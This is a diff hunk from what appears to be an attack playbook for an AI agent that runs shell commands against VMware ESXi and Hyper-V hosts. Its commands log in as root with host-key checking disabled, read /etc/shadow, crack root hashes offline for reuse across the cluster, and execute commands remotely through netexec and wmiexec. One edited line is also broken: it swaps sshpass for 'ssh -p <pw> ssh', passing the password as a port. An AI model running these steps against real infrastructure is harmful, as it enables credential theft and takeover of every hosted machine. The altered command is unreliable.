@@ -365,7 +365,7 @@ service. Own an SSO admin and you own every host and guest in the topology.
   InitiateFileTransferToGuest / FromGuest reads and writes guest files. Prove it by
   running a benign command (whoami / id) and capturing the exit code and output.
 - ESXi SHELL & HOST-LEVEL ACCESS. If you hold ESXi root (SSH on 22, or the shell):
-    darkmoon_execute_command(command="bash -c 'timeout 20 sshpass -p <pw> ssh -o StrictHostKeyChecking=no root@<esxi> \"esxcli system version get; cat /etc/shadow\" 2>&1'")
+    darkmoon_execute_command(command="bash -c 'timeout 20 ssh -p <pw> ssh -o StrictHostKeyChecking=no root@<esxi> \"esxcli system version get; cat /etc/shadow\" 2>&1'")
   Crack the /etc/shadow root hash OFFLINE (hashcat/john) for reuse across the
   cluster, read /etc/vmware/esx.conf and /etc/vmware/hostd for the managed-object
   config, and enumerate every registered VM with esxcli/vim-cmd vmsvc/getallvms.
@@ -398,7 +398,7 @@ PHASE 3 — MICROSOFT HYPER-V
 - HOST MANAGEMENT. Hyper-V is managed over WinRM/WMI; the CIM namespace is
   root\virtualization\v2. With a host credential, drive it through netexec/impacket:
     darkmoon_execute_command(command="bash -c 'timeout 30 netexec winrm <host> -u <user> -p <pw> -x \"Get-VM | Select Name,State\" 2>&1'")
-    darkmoon_execute_command(command="bash -c 'timeout 30 impacket-wmiexec <dom>/<user>:<pw>@<host> \"whoami\" 2>&1'")
+    darkmoon_execute_command(command="bash -c 'timeout 30 wmiexec.py <dom>/<user>:<pw>@<host> \"whoami\" 2>&1'")
 - GUEST DISK READ. The .vhdx and VM .vmcx config live on the host filesystem (and
   often an SMB share, C$ or a dedicated VM share). Read access to a .vhdx is a full
   read of the guest disk, the same filesystem-level bypass as VMware datastore
